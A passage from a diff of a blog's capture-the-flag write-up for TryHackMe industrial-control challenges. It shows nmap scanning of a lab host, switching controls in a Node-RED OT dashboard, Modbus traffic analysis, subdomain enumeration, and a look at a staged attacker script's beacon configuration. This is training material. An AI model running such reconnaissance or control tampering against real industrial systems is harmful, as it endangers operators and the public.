@@ -147,7 +147,7 @@
     "keywords": ["Web","Misc","OSINT","B2R","Boot2Root","Easy","Tryhackme","THM","Forensics","ICS","Industrial Control Systems"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "212"
+    "wordCount": "3177"
   }]
   </script>
 
@@ -686,7 +686,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-06-30T01:09:33&#43;03:00">30 June 2025</time><span class="px-2 text-primary-500">&middot;</span><span>212 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+      <time datetime="2025-06-30T01:09:33&#43;03:00">30 June 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3177 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">15 mins</span>
     
 
     
@@ -763,6 +763,81 @@
     <nav id="TableOfContents">
   <ul>
     <li><a href="#breach">Breach</a></li>
+    <li><a href="#discord">Discord</a>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#step-1-following-the-trail-from-the-channel-description">Step 1: Following the Trail from the Channel Description</a></li>
+        <li><a href="#step-2-executing-the-secret-function">Step 2: Executing the Secret Function</a></li>
+      </ul>
+    </li>
+    <li><a href="#rogue-poller">Rogue Poller</a>
+      <ul>
+        <li><a href="#description-1">Description</a></li>
+        <li><a href="#why-port-502">Why port 502?</a></li>
+        <li><a href="#reassemble-the-conversation">Re‑assemble the conversation</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-1">OSINT 1</a>
+      <ul>
+        <li><a href="#description-2">Description</a></li>
+        <li><a href="#objective">Objective</a></li>
+        <li><a href="#approach">Approach</a></li>
+        <li><a href="#findings">Findings</a></li>
+        <li><a href="#analysis">Analysis</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-2">OSINT 2</a>
+      <ul>
+        <li><a href="#description-3">Description</a></li>
+        <li><a href="#investigation-steps">Investigation Steps</a></li>
+        <li><a href="#1-visited">1. <strong>Visited <code>stage0.virelia-water.it.com</code></strong></a></li>
+        <li><a href="#2-analyzed-initjs">2. Analyzed <code>init.js</code></a></li>
+        <li><a href="#3-queried-the-fallback-subdomain">3. Queried the Fallback Subdomain</a></li>
+      </ul>
+    </li>
+    <li><a href="#orcam">ORCAM</a>
+      <ul>
+        <li><a href="#description-4">Description</a></li>
+        <li><a href="#objective-1">Objective</a></li>
+        <li><a href="#step-1-analyzing-the-email-writing_templateeml">Step 1: Analyzing the Email (Writing_Template.eml)</a></li>
+        <li><a href="#observations">Observations</a></li>
+        <li><a href="#step-2-extracting-the-malicious-macro">Step 2: Extracting the Malicious Macro</a></li>
+        <li><a href="#key-findings-in-the-macro">Key Findings in the Macro:</a></li>
+        <li><a href="#step-3-decrypting-the-shellcode">Step 3: Decrypting the Shellcode</a></li>
+        <li><a href="#python-decryption-script">Python Decryption Script:</a></li>
+        <li><a href="#output-analysis">Output Analysis</a></li>
+        <li><a href="#summary-of-the-investigation">Summary of the Investigation</a></li>
+      </ul>
+    </li>
+    <li><a href="#chess-industry">Chess Industry</a>
+      <ul>
+        <li><a href="#description-5">Description</a></li>
+        <li><a href="#step-1-reconnaissance-port-scanning">Step 1: Reconnaissance (Port Scanning)</a></li>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
+        <li><a href="#step-2-web-enumeration">Step 2: Web Enumeration</a></li>
+        <li><a href="#key-observations">Key Observations</a></li>
+        <li><a href="#step-3-exploiting-the-finger-service-port-79">Step 3: Exploiting the Finger Service (Port 79)</a></li>
+        <li><a href="#what-is-the-finger-protocol">What is the Finger Protocol?</a></li>
+        <li><a href="#why-was-it-dangerous">Why Was It Dangerous?</a></li>
+        <li><a href="#enumerate-users">Enumerate Users</a></li>
+        <li><a href="#step-4-initial-foothold-via-ssh">Step 4: Initial Foothold via SSH</a></li>
+        <li><a href="#step-5-privilege-escalation">Step 5: Privilege escalation</a></li>
+        <li><a href="#attack-path-summary">Attack Path Summary</a></li>
+      </ul>
+    </li>
+    <li><a href="#under-construction">Under Construction</a>
+      <ul>
+        <li><a href="#description-6">Description</a></li>
+        <li><a href="#step-1-reconnaissance-port-scanning-with-nmap">Step 1: Reconnaissance (Port Scanning with Nmap)</a></li>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+        <li><a href="#step-2-exploiting-lfi-local-file-inclusion">Step 2: Exploiting LFI (Local File Inclusion)</a></li>
+        <li><a href="#step-3-finding-ssh-keysexploring-keys-directory">Step 3: Finding SSH Keys(Exploring <code>/keys/</code> Directory)</a></li>
+        <li><a href="#ssh-access">SSH Access</a></li>
+        <li><a href="#step-4-privilege-escalation-checking-sudo-permissions">Step 4: Privilege Escalation (Checking Sudo Permissions)</a></li>
+        <li><a href="#escalating-to-root-via-vi">Escalating to Root via <code>vi</code></a></li>
+        <li><a href="#vulnerabilities-exploited">Vulnerabilities Exploited</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -777,6 +852,81 @@
     <nav id="TableOfContents">
   <ul>
     <li><a href="#breach">Breach</a></li>
+    <li><a href="#discord">Discord</a>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#step-1-following-the-trail-from-the-channel-description">Step 1: Following the Trail from the Channel Description</a></li>
+        <li><a href="#step-2-executing-the-secret-function">Step 2: Executing the Secret Function</a></li>
+      </ul>
+    </li>
+    <li><a href="#rogue-poller">Rogue Poller</a>
+      <ul>
+        <li><a href="#description-1">Description</a></li>
+        <li><a href="#why-port-502">Why port 502?</a></li>
+        <li><a href="#reassemble-the-conversation">Re‑assemble the conversation</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-1">OSINT 1</a>
+      <ul>
+        <li><a href="#description-2">Description</a></li>
+        <li><a href="#objective">Objective</a></li>
+        <li><a href="#approach">Approach</a></li>
+        <li><a href="#findings">Findings</a></li>
+        <li><a href="#analysis">Analysis</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-2">OSINT 2</a>
+      <ul>
+        <li><a href="#description-3">Description</a></li>
+        <li><a href="#investigation-steps">Investigation Steps</a></li>
+        <li><a href="#1-visited">1. <strong>Visited <code>stage0.virelia-water.it.com</code></strong></a></li>
+        <li><a href="#2-analyzed-initjs">2. Analyzed <code>init.js</code></a></li>
+        <li><a href="#3-queried-the-fallback-subdomain">3. Queried the Fallback Subdomain</a></li>
+      </ul>
+    </li>
+    <li><a href="#orcam">ORCAM</a>
+      <ul>
+        <li><a href="#description-4">Description</a></li>
+        <li><a href="#objective-1">Objective</a></li>
+        <li><a href="#step-1-analyzing-the-email-writing_templateeml">Step 1: Analyzing the Email (Writing_Template.eml)</a></li>
+        <li><a href="#observations">Observations</a></li>
+        <li><a href="#step-2-extracting-the-malicious-macro">Step 2: Extracting the Malicious Macro</a></li>
+        <li><a href="#key-findings-in-the-macro">Key Findings in the Macro:</a></li>
+        <li><a href="#step-3-decrypting-the-shellcode">Step 3: Decrypting the Shellcode</a></li>
+        <li><a href="#python-decryption-script">Python Decryption Script:</a></li>
+        <li><a href="#output-analysis">Output Analysis</a></li>
+        <li><a href="#summary-of-the-investigation">Summary of the Investigation</a></li>
+      </ul>
+    </li>
+    <li><a href="#chess-industry">Chess Industry</a>
+      <ul>
+        <li><a href="#description-5">Description</a></li>
+        <li><a href="#step-1-reconnaissance-port-scanning">Step 1: Reconnaissance (Port Scanning)</a></li>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
+        <li><a href="#step-2-web-enumeration">Step 2: Web Enumeration</a></li>
+        <li><a href="#key-observations">Key Observations</a></li>
+        <li><a href="#step-3-exploiting-the-finger-service-port-79">Step 3: Exploiting the Finger Service (Port 79)</a></li>
+        <li><a href="#what-is-the-finger-protocol">What is the Finger Protocol?</a></li>
+        <li><a href="#why-was-it-dangerous">Why Was It Dangerous?</a></li>
+        <li><a href="#enumerate-users">Enumerate Users</a></li>
+        <li><a href="#step-4-initial-foothold-via-ssh">Step 4: Initial Foothold via SSH</a></li>
+        <li><a href="#step-5-privilege-escalation">Step 5: Privilege escalation</a></li>
+        <li><a href="#attack-path-summary">Attack Path Summary</a></li>
+      </ul>
+    </li>
+    <li><a href="#under-construction">Under Construction</a>
+      <ul>
+        <li><a href="#description-6">Description</a></li>
+        <li><a href="#step-1-reconnaissance-port-scanning-with-nmap">Step 1: Reconnaissance (Port Scanning with Nmap)</a></li>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+        <li><a href="#step-2-exploiting-lfi-local-file-inclusion">Step 2: Exploiting LFI (Local File Inclusion)</a></li>
+        <li><a href="#step-3-finding-ssh-keysexploring-keys-directory">Step 3: Finding SSH Keys(Exploring <code>/keys/</code> Directory)</a></li>
+        <li><a href="#ssh-access">SSH Access</a></li>
+        <li><a href="#step-4-privilege-escalation-checking-sudo-permissions">Step 4: Privilege Escalation (Checking Sudo Permissions)</a></li>
+        <li><a href="#escalating-to-root-via-vi">Escalating to Root via <code>vi</code></a></li>
+        <li><a href="#vulnerabilities-exploited">Vulnerabilities Exploited</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -820,8 +970,1235 @@ Be sure to check all the open ports, you never know which one might be your way 
 <p>I did an NMAP scan and these were the results:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV -T4 -p- 10.10.123.189
 </span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-27 12:53 BST
-</span></span><span class="line"><span class="cl">NSOCK ERROR <span class="o">[</span>161.2690s<span class="o">]</span> mksock_bind_addr<span class="o">()</span>: Bind to 0.0.0.
+</span></span><span class="line"><span class="cl">NSOCK ERROR <span class="o">[</span>161.2690s<span class="o">]</span> mksock_bind_addr<span class="o">()</span>: Bind to 0.0.0.0:111 failed <span class="o">(</span>IOD <span class="c1">#16): Address already in use (98)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-123-189.eu-west-1.compute.internal <span class="o">(</span>10.10.123.189<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00029s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65528</span> closed ports
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp    open  http          Werkzeug/3.1.3 Python/3.12.3
+</span></span><span class="line"><span class="cl">102/tcp   open  iso-tsap      Siemens S7 PLC
+</span></span><span class="line"><span class="cl">502/tcp   open  mbap?
+</span></span><span class="line"><span class="cl">1880/tcp  open  vsat-control?
+</span></span><span class="line"><span class="cl">8080/tcp  open  http-proxy    Werkzeug/2.3.7 Python/3.12.3
+</span></span><span class="line"><span class="cl">44818/tcp open  EtherNetIP-2?
+</span></span><span class="line"><span class="cl"><span class="m">4</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">&lt;<span class="o">=======================</span><span class="nv">SNIP</span><span class="o">======================</span>&gt;
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 162.41 seconds
+</span></span></code></pre></div><p>HTTP on port 80 and 8080 both running Werkzeug Python servers (versions 3.1.3 and 2.3.7 respectively).
+Werkzeug is a Python WSGI utility library often used with Flask apps, so these could be web applications worth exploring for vulnerabilities or misconfigurations.</p>
+<p>Visiting port 80:
+
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Por80" src="/images/THM/Breach/Port80.png">
+
+  
+</figure>
+</p>
+<p>Leveraging some online research, I learnt that there is a UI page for the service running on port 1880 which is Node-RED. On visiting the discovered UI endpoint, I changed the status of these switches:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="OT_Dashboard" src="/images/THM/Breach/OT_dashboard.png">
+
+  
+</figure>
+</p>
+<p>That got me the Flag for this challenge:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Flag" src="/images/THM/Breach/Flag_Breach.png">
+
+  
+</figure>
+</p>
+
+<h2 class="relative group">Discord 
+    <div id="discord" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#discord" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Description 
+    <div id="description" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<blockquote>
+<p>Join our Discord server and find the flag?</p></blockquote>
+
+<h3 class="relative group">Step 1: Following the Trail from the Channel Description 
+    <div id="step-1-following-the-trail-from-the-channel-description" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-following-the-trail-from-the-channel-description" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The journey started in the <code>#industrial-intrusion-ctf</code> channel. While browsing through the channel list, I noticed something unusual in the <strong>channel description</strong>. As shown below, the description of the channel wasn&rsquo;t just text – it included a <strong>URL</strong> ending with: <code>/secret-function</code> :</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="DiscordTHM.png" src="/images/THM/Discord/DiscordTHM.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">Step 2: Executing the Secret Function 
+    <div id="step-2-executing-the-secret-function" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-executing-the-secret-function" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>After seeing the <code>/secret-function</code> clue, I suspected it might be a <strong>custom slash command</strong> integrated into the TryHackMe Discord bot. Discord supports slash commands which can be triggered by typing <code>/</code> followed by the command name.</p>
+<p>So, I typed: <code>/secret-function</code> .
+As seen below, this triggered a response from the <strong>TryHackMe bot</strong> – and bingo! It revealed the flag:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="DiscordTHM.png" src="/images/THM/Discord/DiscordFlag.png">
+
+  
+</figure>
+</p>
+
+<h2 class="relative group">Rogue Poller 
+    <div id="rogue-poller" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#rogue-poller" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Description 
+    <div id="description-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<blockquote>
+<p>An intruder has breached the internal OT network and systematically probed industrial devices for sensitive data.
+Network captures reveal unusual traffic from a suspicious host scanning PLC memory over TCP port 502.
+Analyse the provided PCAP and uncover what data the attacker retrieved during their register scans.</p></blockquote>
+
+<h3 class="relative group">Why port 502? 
+    <div id="why-port-502" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#why-port-502" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The capture was taken in an <strong>ICS/SCADA</strong> setting.</p>
+<p>Industrial controllers often speak <strong>Modbus‑TCP</strong>, and Modbus always defaults to <strong>TCP port 502</strong>. If something suspicious is happening in a poller/PLC scenario, 502 is the first place to look. Filter for the said port: <code>tcp.port == 502</code> , Click on the first packet and follow TCP stream:</p>
+
+<h3 class="relative group">Re‑assemble the conversation 
+    <div id="reassemble-the-conversation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#reassemble-the-conversation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li><strong>Click the first packet</strong> in the list (frame 33 in my capture).</li>
+<li><strong>Right‑click ▸ Follow ▸ TCP Stream</strong>.</li>
+</ol>
+<p>Wireshark stitches every segment of that TCP session together and shows it in a single window.</p>
+<p>Make sure the <em>Show data as</em> drop‑down is set to <strong>ASCII</strong> – Modbus payloads are plain bytes, so ASCII is the quickest view when you&rsquo;re hunting for embedded strings.</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="RoguePoller_Flag.png" src="/images/THM/RoguePoller/RoguePoller_Flag.png">
+
+  
+</figure>
+</p>
+<p>Every printable byte is exactly one character of the flag – they&rsquo;re merely separated by unprintable padding bytes (typical when registers are filled two bytes at a time).</p>
+<ul>
+<li>In the Follow‑Stream window copy just the visible characters (ignore dots and line breaks) into a text editor.</li>
+<li>Delete the whitespace → the same string emerges.</li>
+</ul>
+<p>Reconstruct the flag: <code>THM{1nDu5tr14l_r3g1$t3rs}</code></p>
+
+<h2 class="relative group">OSINT 1 
+    <div id="osint-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#osint-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Description 
+    <div id="description-2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-2" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<blockquote>
+<p>Hexline, we need your help investigating the phishing attack from 3 months ago.
+We believe the threat actor managed to hijack our domain virelia-water.it.com and used it to host some of their infrastructure at the time.
+Use your OSINT skills to find information about the infrastructure they used during their campaign.</p></blockquote>
+
+<h3 class="relative group">Objective 
+    <div id="objective" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#objective" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Investigate potential infrastructure used in a phishing campaign tied to the hijacked domain <code>virelia-water.it.com</code>.</p>
+
+<h3 class="relative group">Approach 
+    <div id="approach" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#approach" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Using OSINT tools like <code>Sublist3r</code> and <code>crt.sh</code>, subdomain enumeration was performed to identify any attacker-controlled assets.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sublist3r -d virelia-water.it.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                 ____        _     _ _     _   _____
+</span></span><span class="line"><span class="cl">                / ___<span class="p">|</span> _   _<span class="p">|</span> <span class="p">|</span>__ <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span>___<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>___ / _ __
+</span></span><span class="line"><span class="cl">                <span class="se">\_</span>__ <span class="se">\|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="s1">&#39;_ \| | / __| __| |_ \| &#39;</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                 ___<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\ </span><span class="p">|</span>_ ___<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">                <span class="p">|</span>____/ <span class="se">\_</span>_,_<span class="p">|</span>_.__/<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>___/<span class="se">\_</span>_<span class="p">|</span>____/<span class="p">|</span>_<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1"># Coded By Ahmed Aboul-Ela - @aboul3la</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Enumerating subdomains now <span class="k">for</span> virelia-water.it.com
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Baidu..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Yahoo..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Google..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Bing..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Ask..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Netcraft..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in DNSdumpster..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Virustotal..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in ThreatCrowd..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in SSL Certificates..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in PassiveDNS..
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Error: Virustotal probably now is blocking our requests
+</span></span><span class="line"><span class="cl">Process DNSdumpster-8:
+</span></span><span class="line"><span class="cl">&lt;<span class="o">========================</span><span class="nv">SNIP</span><span class="o">=====================</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Total Unique Subdomains Found: <span class="m">2</span>
+</span></span><span class="line"><span class="cl">54484d7b5375357373737d.virelia-water.it.com
+</span></span><span class="line"><span class="cl">stage0.virelia-water.it.com
 </span></span></code></pre></div>
+<h3 class="relative group">Findings 
+    <div id="findings" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#findings" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Two subdomains were discovered:</p>
+<ul>
+<li><code>54484d7b5375357373737d.virelia-water.it.com</code></li>
+<li><code>stage0.virelia-water.it.com</code></li>
+</ul>
+<p>The first appeared to be encoded.</p>
+
+<h3 class="relative group">Analysis 
+    <div id="analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>The subdomain <code>54484d7b5375357373737d</code> was identified as hex.</li>
+<li>Decoding it with <code>xxd</code> revealed a CTF flag:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> 54484d7b5375357373737d <span class="p">|</span> xxd -r -p <span class="c1"># Command used</span>
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>Su5sss<span class="o">}</span> <span class="c1"># Subsequent Output</span>
+</span></span></code></pre></div>
+<h2 class="relative group">OSINT 2 
+    <div id="osint-2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#osint-2" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Description 
+    <div id="description-3" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-3" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<blockquote>
+<p>Great work on uncovering that suspicious subdomain, Hexline.
+However, your work here isn&rsquo;t done yet, we believe there is more.</p></blockquote>
+<p>After uncovering an initial suspicious subdomain (<code>stage0.virelia-water.it.com</code>), further analysis led to the discovery of an external script and a fallback communication mechanism used by the attacker&rsquo;s infrastructure. The goal of OSINT 2 was to <strong>pivot from stage0 and uncover hidden indicators of compromise</strong> using DNS and passive reconnaissance techniques.</p>
+
+<h3 class="relative group">Investigation Steps 
+    <div id="investigation-steps" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#investigation-steps" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+<h3 class="relative group">1. <strong>Visited <code>stage0.virelia-water.it.com</code></strong> 
+    <div id="1-visited" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#1-visited" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>Discovered a spoofed ICS operator console web interface.</li>
+<li>It attempted to load a remote JavaScript file from:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">https://raw.githubusercontent.com/SanTzu/uplink-config/main/init.js
+</span></span></code></pre></div><p>You could see this from reviewing the page&rsquo;s source code.</p>
+
+<h3 class="relative group">2. Analyzed <code>init.js</code> 
+    <div id="2-analyzed-initjs" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#2-analyzed-initjs" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>Contained a hardcoded object:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">var <span class="nv">beacon</span> <span class="o">=</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  session_id: <span class="s2">&#34;O-TX-11-403&#34;</span>,
+</span></span><span class="line"><span class="cl">  fallback_dns: <span class="s2">&#34;uplink-fallback.virelia-water.it.com&#34;</span>,
+</span></span><span class="line"><span class="cl">  token: <span class="s2">&#34;JBSWY3DPEBLW64TMMQQQ==&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span><span class="p">;</span>
+</span></span></code></pre></div><ul>
+<li>The <code>token</code> decoded (Base32) to: <code>Hello123</code> (possibly a password or operator key).</li>
+<li>Revealed the next lead: <code>uplink-fallback.virelia-water.it.com</code></li>
+</ul>
+
+<h3 class="relative group">3. Queried the Fallback Subdomain 
+    <div id="3-queried-the-fallback-subdomain" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#3-queried-the-fallback-subdomain" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><code>A</code> and <code>CNAME</code> queries returned <strong>no IP</strong> – typical of dormant or DNS-only infrastructure.</li>
+<li>However, a <code>TXT</code> record was present:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig uplink-fallback.virelia-water.it.com TXT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.20.2-1-Debian &lt;&lt;&gt;&gt; uplink-fallback.virelia-water.it.com TXT
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
